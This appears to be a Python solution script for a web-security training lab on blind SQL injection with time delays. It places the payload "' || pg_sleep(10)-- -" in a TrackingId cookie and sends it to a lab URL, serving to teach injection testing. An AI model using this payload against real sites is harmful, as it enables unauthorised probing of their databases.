#########################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 23/9/2023
#
# Lab: Blind SQL injection with time delays
#
# Steps: 1. Inject payload into 'TrackingId' cookie to cause a 10 seconds delay
#        2. Wait for the response
#
#########################################################################################


###########
# imports
###########
import requests
from colorama import Fore


#########
# Main
#########

# change this to your lab URL
url = "https://0aa1000d048041f88343fbc40064000b.web-security-academy.net"

print(Fore.BLUE + "[#] Injection point: " + Fore.YELLOW + "TrackingId")

# payload to cause a 10 seconds delay
payload = "' || pg_sleep(10)-- -"

# set trackingId cookie
cookies = {
    'TrackingId': payload
}

print(Fore.WHITE + "1. Injecting payload to cause a 10 seconds delay.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "2. Waiting for the response.. ", end='\r', flush=True)

try:      
    # cause the delay with the injected payload
    make_delay = requests.get(f"{url}/filter?category=Pets", cookies=cookies)

except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)
    
# if the response is OK after the delay
if make_delay.status_code == 200:
    print(Fore.WHITE + "2. Waiting for the response.. " + Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

else:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload")
